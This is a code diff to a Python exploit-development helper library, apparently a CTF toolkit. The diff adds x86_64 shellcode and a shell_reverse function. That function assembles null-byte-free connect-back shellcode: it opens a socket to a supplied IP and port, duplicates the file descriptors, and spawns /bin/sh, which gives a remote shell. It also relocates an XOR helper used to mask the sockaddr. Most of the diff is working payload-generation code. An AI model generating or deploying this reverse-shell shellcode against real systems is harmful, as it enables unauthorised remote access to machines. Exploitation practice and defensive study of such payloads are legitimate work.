@@ -116,6 +116,10 @@ def capstone_dump(code, arch=capstone.CS_ARCH_X86, mode=capstone.CS_MODE_32, col
       line += "%s %s" % (i.mnemonic, i.op_str)
     print line
 
+def xor_str(s, key):
+  return "".join(chr(ord(c)^ord(k)) for c, k in zip(s, itertools.cycle(key)))
+
+
 class x86:
   @staticmethod
   def assemble(code, **kw):
@@ -124,6 +128,7 @@ class x86:
   def disas(code, **kw):
     capstone_dump(code, capstone.CS_ARCH_X86, capstone.CS_MODE_32, **kw)
 
+
 class x86_64:
   @staticmethod
   def assemble(code, **kw):
@@ -131,6 +136,7 @@ class x86_64:
   @staticmethod
   def disas(code, **kw):
     capstone_dump(code, capstone.CS_ARCH_X86, capstone.CS_MODE_64, **kw)
+
 
 class x86_shellcode:
   shell = x86.assemble(""" ; execve("/bin//sh", 0, 0);
@@ -211,7 +217,18 @@ class x86_shellcode:
     assert contains_not(sc, "\0")
     return sc + x86_shellcode.dup2_ebx + x86_shellcode.shell
 
+
 class x86_64_shellcode:
+  dup2_rdi = x86_64.assemble("""
+    push 3
+    pop rsi
+  duploop:
+    dec rsi
+    push 0x21
+    pop rax
+    syscall
+    jne duploop
+    """)
   shell = x86_64.assemble("""
     xor rdi, rdi
     push rdi
@@ -227,6 +244,52 @@ class x86_64_shellcode:
     pop rax
     syscall
     """)
+  @staticmethod
+  def shell_reverse(addr, port, no_null=True):
+    def p(x): return struct.pack("Q", x)
+    def u(x): return struct.pack("Q", x)
+    sockaddr = (
+      "\x02\x00" +
+      chr(port>>8) + chr(port&0xff) +
+      "".join(chr(int(x)) for x in addr.split(".")))
+    # this is to avoid nullbytes only
+    a = "\0"*8
+    while no_null and '\0' in xor_str(a, sockaddr):
+      a = "".join(chr(random.randint(0,0xff)) for _ in xrange(8))
+    a_q = struct.unpack("Q", a)[0]
+    b_q = struct.unpack("Q", xor_str(a, sockaddr))[0]
+    sc = x86_64.assemble("""
+      ; socket
+      push 0x29
+      pop rax
+      cdq
+      push 2
+      pop rdi
+      push 1
+      pop rsi
+      syscall
+      ; connect
+      xchg rax, rdi
+      mov rcx, {b}
+      """.format(b=b_q) +
+      ("""
+      mov rdx, {a}
+      xor rcx, rdx
+      """.format(a=a_q) if a != '\0'*8 else "") +
+      """
+      push rcx
+      mov rsi, rsp
+      push 0x10
+      pop rdx
+      push 0x2a
+      pop rax
+      syscall
+      """)
+    x86_64.disas(sc)
+    if no_null:
+      assert contains_not(sc, "\0")
+    return sc + x86_64_shellcode.dup2_rdi + x86_64_shellcode.shell
+
 
 for c in [x86_shellcode, x86_64_shellcode]:
   for k, sc in c.__dict__.items():
@@ -282,9 +345,6 @@ def instrument(cmd, args, env):
   return (os.fdopen(stdin_write, "w"),
           os.fdopen(stdout_read, "r"),
           lambda: os.waitpid(pid, 0))
-
-def xor_str(s, key):
-  return "".join(chr(ord(c)^ord(k)) for c, k in zip(s, itertools.cycle(key)))
 
 def connect(host, port):
   s = socket.create_connection((host, port))
